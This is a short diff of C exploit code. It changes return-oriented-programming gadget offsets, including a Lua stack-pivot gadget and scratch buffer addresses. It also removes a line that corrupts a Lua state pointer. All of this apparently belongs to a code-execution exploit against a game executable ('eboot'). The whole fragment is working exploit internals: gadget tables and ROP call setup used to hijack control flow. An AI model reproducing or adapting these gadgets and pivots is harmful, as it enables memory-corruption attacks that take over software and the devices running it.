@@ -76,8 +76,10 @@ static u64 POP_R15_RET = 0x1428;
 static u64 MOV_DEREF_RDI_RAX_RET = 0x75b6c; // mov qword [rdi], rax ; ret ;
 static u64 MOV_RAX_DEREF_RAX_RET = 0x23ac20; // mov rax, qword [rax] ; ret ;
 static u64 PIVOT_GADGET2 = 0x2e3aac; // pop rsi ; or al, 0xED ; jmp qword [rdi+0x0C] ;
-//static u64 LUA_PIVOT1 = 0x133ed2; // mov rax, qword [rdi] ; jmp qword [rax+0x00000100] ;
-static u64 LUA_PIVOT1 = 0x1b8640; // mov rax, qword [rdi] ; jmp qword [rax+0x20] ;
+
+// mov rax, qword [0x0000000002DC8A50] ; jmp qword [rax+0x48] ;
+static u64 LUA_PIVOT1 = 0x129039; 
+
 static u64 LUA_PIVOT_SCRATCH = 0x5C00000;
 static u64 DIALOG_SCRATCH = 0x3C00000;
 // scratch buffer in eboot for lua arw
@@ -996,11 +998,6 @@ void initialize_lua() {
     }
     
     send_notification("Executing... init.lua");
-    
-    // LUA ROP PIVOT buffer
-    // [rdi] will be LUA_PIVOT_SCRATCH
-    // With GC disabled corrupting lua state 0x0 is okay? I guess
-    write64(lua_state, LUA_PIVOT_SCRATCH);
 
     u64 exec_status = call_rop(lua_pcall, 0,
                                lua_state,
